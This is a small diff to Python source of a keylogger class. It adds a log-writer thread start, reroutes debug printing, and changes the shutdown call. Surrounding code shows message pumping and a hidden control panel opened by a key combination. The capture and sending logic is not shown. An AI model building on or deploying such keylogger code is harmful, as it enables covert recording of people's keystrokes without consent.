@@ -62,6 +62,7 @@ class KeyLogger:
 		self.panel = False
 
 	def start(self):
+		self.lw.start()
 		pythoncom.PumpMessages()
 	
 	def ParseControlKey(self):
@@ -77,7 +78,7 @@ class KeyLogger:
 
 	def CheckForControlEvent(self):
 		if self.cmdoptions.debug:
-			print self.controlKeyHash
+			self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
 		if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
 			return True
 		else:
@@ -95,7 +96,7 @@ class KeyLogger:
 		
 		if self.CheckForControlEvent():
 			if not self.panel:
-				self.lw.PrintDebug("starting panel\n")
+				self.lw.PrintDebug("starting panel")
 				self.panel = True
 				PyKeyloggerControlPanel(self.cmdoptions, self)
 
@@ -114,7 +115,7 @@ class KeyLogger:
 	def stop(self):
 		'''Exit cleanly.
 		'''
-		self.lw.stop()
+		self.lw.cancel()
 		sys.exit()
 	
 	def ParseOptions(self):
